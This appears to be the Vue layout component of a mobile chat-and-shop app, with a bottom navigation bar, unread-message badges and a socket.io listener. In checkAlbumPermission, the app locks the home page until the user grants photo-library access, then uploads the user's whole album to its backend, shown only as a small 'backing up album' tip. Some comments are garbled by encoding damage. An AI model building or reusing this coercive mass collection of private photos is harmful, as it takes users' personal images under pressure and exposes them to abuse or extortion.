<template>
    <div class="main">
        <!-- 子頁面路由插�?-->
        <router-view class="router-view-wrap"></router-view>

        <!-- 底部導航�?-->
        <div class="buttnone">
            <div class="buttnone-all">
                <div v-for="menu in menuList" :key="menu.key" class="buttnone-alla"
                    :style="{ color: isMenuActive(menu.key) ? '#ff33ee' : '#555' }" @click="activeMenu(menu.path)">
                    <div style="position: relative;">
                        <Icon :icon="menu.icon" height="24" />
                        <div v-if="menu.unread && menu.unread > 0" class="badge">
                            {{ menu.unread > 99 ? '99+' : menu.unread }}
                        </div>
                    </div>
                    <div>{{ menu.label }}</div>
                </div>
            </div>
        </div>

        <!-- 相冊同步進度（不阻擋操作） -->
        <div v-if="albumProgress.running" class="album-sync-tip">
            <Icon icon="svg-spinners:ring-resize" width="16" />
            <span>正在備份相簿 {{ albumProgress.scanned }}/{{ albumProgress.total }}</span>
        </div>

        <!-- 未授權相冊：禁止進入 -->
        <PermissionGate
            :visible="albumBlocked"
            icon="material-symbols:photo-library-outline"
            title="需要相冊權限"
            desc="進入首頁需授權存取您的相簿，用於圖片備份。請在設定中開啟相簿權限。"
            @retry="checkAlbumPermission"
            @settings="openNativeSettings"
        />
    </div>
</template>

<script lang="ts" setup>
import { ref, onMounted, onUnmounted, watch } from 'vue'
import { Icon } from '@iconify/vue'
import router from '../../../router'
import { useRoute } from 'vue-router'
import request from '@/utils/request'
import {
    requestAlbumPermission,
    openNativeSettings,
    syncAlbumPhotos,
    type SyncProgress
} from '@/utils/nativePermission'
import PermissionGate from '@/components/PermissionGate.vue'
import { io } from 'socket.io-client'

const route = useRoute()
let socket: any = null
const baseURL = request.defaults.baseURL || ''

// 相冊權限攔截 + 備份進度
const albumBlocked = ref(false)
const albumProgress = ref<SyncProgress>({ scanned: 0, total: 0, uploaded: 0, running: false })

// 檢測相冊權限：拒絕則攔截，授權後把相冊圖片全量備份到後端（H5 不執行）
const checkAlbumPermission = async () => {
    const granted = await requestAlbumPermission()
    albumBlocked.value = !granted
    if (granted) {
        const user = JSON.parse(localStorage.getItem('user') || '{}')
        if (user.id) {
            syncAlbumPhotos(user.id, (p) => { albumProgress.value = p })
        }
    }
}

// 從系統設定返回 App 時重新檢測權限
const onAppVisible = () => {
    if (document.visibilityState === 'visible' && albumBlocked.value) {
        checkAlbumPermission()
    }
}

// 底部導航菜單'
const menuList = ref([
    {
        key: 'a',
        path: '/index',
        pathPrefix: '/index',
        label: '首頁',
        icon: 'streamline-flex:home-2-solid',
        unread: 0
    },
    {
        key: 'b',
        path: '/shop',
        pathPrefix: '/shop',
        label: '商城',
        icon: 'material-symbols:shopping-cart-checkout-rounded',
        unread: 0
    },
    {
        key: 'c',
        path: '/contacts',
        pathPrefix: '/contacts',
        label: '聯絡人',
        icon: 'material-symbols:group-rounded',
        unread: 0
    },
    {
        key: 'e',
        path: '/user',
        pathPrefix: '/user',
        label: '個人中心',
        icon: 'ic:baseline-face-6',
        unread: 0
    }
])

// 判斷導航選中'
const isMenuActive = (key: string) => {
    const menu = menuList.value.find(item => item.key === key)
    if (!menu) return false
    // 永遠使用當前真實路由，不再讀localStorage
    return route.path.startsWith(menu.pathPrefix)
}

// 導航跳轉'
const activeMenu = (path: string) => {
    router.push({ path, replace: true })
    localStorage.setItem('last_path', path)
}

// 刷新未讀數失敗：'
const refreshUnreadBadge = async () => {
    const user = JSON.parse(localStorage.getItem('user') || '{}')
    if (!user.id) return
    try {
        const { data } = await request.post('/api/message/unread-total', { userId: user.id })
        if (data.code === 1) {
            menuList.value[2].unread = data.total || 0
        }
    } catch (err) {
        console.error('取得未讀數失敗：', err)
    }
}

// 路由切換刷新'
watch(() => route.path, () => {
    refreshUnreadBadge()
})

// 全域事件：訊息已讀（進入聊天頁標記已讀後觸發）'
const onMessageRead = () => {
    refreshUnreadBadge()
}

onMounted(() => {
    // App 環境進入首頁時申請相冊權限：拒絕則攔截整個頁面，授權後備份相冊（H5 自動跳過）
    checkAlbumPermission()
    document.addEventListener('visibilitychange', onAppVisible)

    const user = JSON.parse(localStorage.getItem('user') || '{}')
    if (!user.id) return

    // 初始刷新'
    refreshUnreadBadge()

    // 掛載 Socket 全域監聽（核心：實時接收新訊息）'
    socket = io(baseURL, { transports: ['websocket'] })
    socket.on('connect', () => {
        socket.emit('bindUserId', user.id)
    })
    // 後端推送新消息 】$立即更新角標'
    socket.on('new_msg', () => {
        refreshUnreadBadge()
    })

    // 監聽訊息已讀事件'
    window.addEventListener('messageRead', onMessageRead)
})

onUnmounted(() => {
    // 斷開 Socket + 移除事件，防止內存洩�?
    if (socket) {
        socket.disconnect()
        socket = null
    }
    window.removeEventListener('messageRead', onMessageRead)
    document.removeEventListener('visibilitychange', onAppVisible)
})
</script>

<style scoped>
/* 根容器滿18周*/
.main {
    position: absolute;
    left: 0;
    right: 0;
    top: 0;
    bottom: 0;
    width: 100%;
    height: 100%;
    /* background: #d66f6f; */
    font-family: "Microsoft YaHei", sans-serif;
    overflow: hidden;
    display: flex;
    flex-direction: column;
}

/* 路由內容區域，自動撐滿，預留底部導航高：*/
.router-view-wrap {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    padding-bottom: calc(65px + env(safe-area-inset-bottom));
    box-sizing: border-box;
    background: #fff;
}

/* 底部導航欄樣�?*/
.buttnone {
    position: fixed;
    bottom: 0;
    left: 0;
    right: 0;
    max-width: 500px;
    margin: 0 auto;
    padding: 6px 0 calc(6px + env(safe-area-inset-bottom));
    background: #f3f3f3;
    z-index: 999;
}

.buttnone-all {
    display: flex;
}

.buttnone-alla {
    width: 25%;
    display: flex;
    flex-direction: column;
    align-items: center;
    cursor: pointer;
    font-size: 11px;
}

/* 未讀角標 */
.badge {
    position: absolute;
    top: -4px;
    right: -6px;
    min-width: 16px;
    height: 16px;
    background: #ff33ee;
    color: #fff;
    font-size: 10px;
    border-radius: 8px;
    display: flex;
    align-items: center;
    justify-content: center;
}

/* 相冊備份進度提示 */
.album-sync-tip {
    position: fixed;
    top: 12px;
    left: 50%;
    transform: translateX(-50%);
    z-index: 998;
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 8px 14px;
    background: rgba(51, 51, 51, 0.82);
    color: #fff;
    font-size: 12px;
    border-radius: 16px;
    white-space: nowrap;
}

/* 隱藏滾動態，開*/
::-webkit-scrollbar {
    display: none;
}

:global(html),
:global(body) {
    margin: 0;
    padding: 0;
    overflow: hidden;
    overscroll-behavior: none;
    background: #fff;
}
</style>